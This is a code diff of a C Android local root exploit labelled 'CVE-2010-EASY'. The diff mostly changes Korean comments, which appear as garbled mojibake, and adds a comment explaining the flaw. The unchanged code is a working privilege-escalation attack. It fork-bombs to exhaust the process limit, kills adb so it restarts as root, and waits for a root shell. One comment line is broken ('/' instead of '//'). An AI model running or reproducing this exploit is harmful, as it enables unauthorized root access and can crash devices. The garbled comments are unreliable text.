@@ -8,6 +8,10 @@
  * If you run it, it might crash your device and make it unusable!
  * So you use it at your own risk!
  */
+/*
+ * adb í”„ë¡œì„¸ìŠ¤ë¥¼ fork() ë¦¬ë¯¸íŠ¸ê°€ ìˆì„ ë•Œ, í¬í¬ê°€ ì‹¤íŒ¨í•˜ëŠ” â€“1ì„ ë¦¬í„´í•  ë•Œ, uidê°€ 0ì¸ adb ë¦¬ì…‹ì´ ë§Œë“¤ì–´ì§€ê³ , 
+ * ì´ëŸ° í™˜ê²½ì—ì„œ ë£¨íŠ¸ì‰˜ì´ ëœ¨ê¸° ë•Œë¬¸ì— ì·¨ì•½í•©ë‹ˆë‹¤.
+*/
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/time.h>
@@ -20,14 +24,14 @@
 #include <stdlib.h>
 
 
-// ÇÁ·Î¼¼½º Á¾°á ÇÔ¼ö.
+// í”„ë¡œì„¸ìŠ¤ ì¢…ê²° í•¨ìˆ˜.
 void die(const char *msg)
 {
 	perror(msg);
 	exit(errno);
 }
 
-// ÇÁ·Î¼¼½º ¸í·ÉÇà¿¡¼­ /sbin/adb°¡ ¸Â´ÂÁö Ã£¾Æ¼­ ¸®ÅÏ.
+// í”„ë¡œì„¸ìŠ¤ ëª…ë ¹í–‰ì—ì„œ /sbin/adbê°€ ë§ëŠ”ì§€ ì°¾ì•„ì„œ ë¦¬í„´.
 pid_t find_adb()
 {
 	char buf[256];
@@ -50,20 +54,20 @@ pid_t find_adb()
 }
 
 
-// adb ¸®½ºÅ¸Æ® ÇÔ¼ö.
+// adb ë¦¬ìŠ¤íƒ€íŠ¸ í•¨ìˆ˜.
 void restart_adb(pid_t pid)
 {
 	kill(pid, 9);
 }
 
 
-// find_adb·Î ·çÆ®½© adb ±â´É.
+// find_adbë¡œ ë£¨íŠ¸ì‰˜ adb ê¸°ëŠ¥.
 void wait_for_root_adb(pid_t old_adb)
 {
 	pid_t p = 0;
 
 	for (;;) {
-		p = find_adb(); // old_adb°¡ pid°¡ 0ÀÌ ¾Æ´Ï¸é ÄÚµå ºê·¹ÀÌÅ©ÇØ¼­ adb ¸®¼ÂÇÏ°í ·çÆ®½©ÀÌ ¶ßµµ·Ï ÇÔ.
+		p = find_adb(); // old_adbê°€ pidê°€ 0ì´ ì•„ë‹ˆë©´ ì½”ë“œ ë¸Œë ˆì´í¬í•´ì„œ adb ë¦¬ì…‹í•˜ê³  ë£¨íŠ¸ì‰˜ì´ ëœ¨ë„ë¡ í•¨.
 		if (p != 0 && p != old_adb)
 			break;
 		sleep(1);
@@ -84,11 +88,11 @@ int main(int argc, char **argv)
 	printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
 	printf("[*] checking NPROC limit ...\n");
 
-	// getrlimit·Î RLIMIT_NPROC ¸î°³ÀÇ ÇÁ·Î¼¼½º°¡ ÇÑ°èÄ¡ÀÎÁö rl º¯¼ö¿¡ ÀĞ¾î¿È.
+	// getrlimitë¡œ RLIMIT_NPROC ëª‡ê°œì˜ í”„ë¡œì„¸ìŠ¤ê°€ í•œê³„ì¹˜ì¸ì§€ rl ë³€ìˆ˜ì— ì½ì–´ì˜´.
 	if (getrlimit(RLIMIT_NPROC, &rl) < 0)
 		die("[-] getrlimit");
 
-	/ rlimit_nproc°¡ ¼³Á¤µÇÁö ¾Ê¾ÒÀ¸¸é ÀÍ½ºÇÃ·ÎÀÕÀÌ µÇÁö ¾ÊÀ½.
+	/ rlimit_nprocê°€ ì„¤ì •ë˜ì§€ ì•Šì•˜ìœ¼ë©´ ìµìŠ¤í”Œë¡œì‡ì´ ë˜ì§€ ì•ŠìŒ.
 	if (rl.rlim_cur == RLIM_INFINITY) {
 		printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
 		exit(1);
@@ -97,7 +101,7 @@ int main(int argc, char **argv)
 	printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
 	printf("[*] Searching for adb ...\n");
 
-	// adb ÇÁ·Î¼¼½ºÀÇ pid ÇÁ·Î¼¼½º ¾ÆÀÌµğ Ã£À½.
+	// adb í”„ë¡œì„¸ìŠ¤ì˜ pid í”„ë¡œì„¸ìŠ¤ ì•„ì´ë”” ì°¾ìŒ.
 	adb_pid = find_adb();
 
 	if (!adb_pid)
@@ -111,17 +115,17 @@ int main(int argc, char **argv)
 	       "[*] we also accept donations > 1000 USD!\n");
 	printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");
 
-	// 5ÃÊ ½½¸³.
+	// 5ì´ˆ ìŠ¬ë¦½.
 	sleep(5);
 
-	// ÇÁ·Î¼¼½º 1°³ »ı¼º.
+	// í”„ë¡œì„¸ìŠ¤ 1ê°œ ìƒì„±.
 	if (fork() > 0)
 		exit(0);
 
-	// sid ¼³Á¤.
+	// sid ì„¤ì •.
 	setsid();
 
-	// ÆÄÀÌÇÁ »ı¼º.
+	// íŒŒì´í”„ ìƒì„±.
 	pipe(pepe);
 
 	/* generate many (zombie) shell-user processes so restarting
@@ -131,42 +135,42 @@ int main(int argc, char **argv)
 	 * fill before adb reaches setuid(). Thats why we fork-bomb
 	 * in a seprate process.
 	 */
-	// ºÎ¸ğ ÇÁ·Î¼¼½ºÀÏ ¶§ pepe[0]) ÀÔ·ÂÀ» ´İ°í, ÇÁ·Î¼¼½º¸¦ ¹«ÇÑ·çÇÁ ³»¿¡¼­ »ı¼º
+	// ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì¼ ë•Œ pepe[0]) ì…ë ¥ì„ ë‹«ê³ , í”„ë¡œì„¸ìŠ¤ë¥¼ ë¬´í•œë£¨í”„ ë‚´ì—ì„œ ìƒì„±
 	if (fork() == 0) {
 		close(pepe[0]);
 		for (;;) {
 			if ((p = fork()) == 0) {
 				exit(0);
-			} else if (p < 0) { // ÀÚ½Ä ÇÁ·Î¼¼½º  ÀÏ¶§.
+			} else if (p < 0) { // ìì‹ í”„ë¡œì„¸ìŠ¤  ì¼ë•Œ.
 				if (new_pids) {
 					printf("\n[+] Forked %d childs.\n", pids);
 					new_pids = 0;
-					write(pepe[1], &c, 1); // ÆÄÀÌÇÁ Ãâ·Â.
+					write(pepe[1], &c, 1); // íŒŒì´í”„ ì¶œë ¥.
 					close(pepe[1]);
 				}
 			} else {
-				++pids; // »ı¼ºµÇ´Â pids ¼ö¸¦ Ã¼Å©.
+				++pids; // ìƒì„±ë˜ëŠ” pids ìˆ˜ë¥¼ ì²´í¬.
 			}
 		}
 	}
 
-	// pepe[1] (Ãâ·Â ÆÄÀÌÇÁ)¸¦ ´İÀ½.
+	// pepe[1] (ì¶œë ¥ íŒŒì´í”„)ë¥¼ ë‹«ìŒ.
 	close(pepe[1]);
-	// pepe[0] (ÀÔ·Â ÆÄÀÌÇÁ)·ÎºÎÅÍ c¿¡ 1¹ÙÀÌÆ® ÀĞÀ½.
+	// pepe[0] (ì…ë ¥ íŒŒì´í”„)ë¡œë¶€í„° cì— 1ë°”ì´íŠ¸ ì½ìŒ.
 	read(pepe[0], &c, 1);
 
 
-	// adb ¸®¼Â. (Ãë¾àÁ¡ Æ®¸®°Å¸µ).
+	// adb ë¦¬ì…‹. (ì·¨ì•½ì  íŠ¸ë¦¬ê±°ë§).
 	restart_adb(adb_pid);
 
-	// ÇÁ·Î¼¼½º µÎ ¹øÂ° »ı¼º (Æ÷Å©) ½Ãµµ.
+	// í”„ë¡œì„¸ìŠ¤ ë‘ ë²ˆì§¸ ìƒì„± (í¬í¬) ì‹œë„.
 	if (fork() == 0) {
-		fork(); // ÀÚ½Ä ÇÁ·Î¼¼½º Æ÷Å©.
+		fork(); // ìì‹ í”„ë¡œì„¸ìŠ¤ í¬í¬.
 		for (;;)
 			sleep(0x743C);
 	}
 
-	// ÀÚ½Ä ÇÁ·Î¼¼½º ÀÏ ¶§, adb¸®¼ÂÀ¸·Î ·çÆ®½© ¶ß¹Ç·Î È¹µæ.
+	// ìì‹ í”„ë¡œì„¸ìŠ¤ ì¼ ë•Œ, adbë¦¬ì…‹ìœ¼ë¡œ ë£¨íŠ¸ì‰˜ ëœ¨ë¯€ë¡œ íšë“.
 	wait_for_root_adb(adb_pid);
 	return 0;
 }
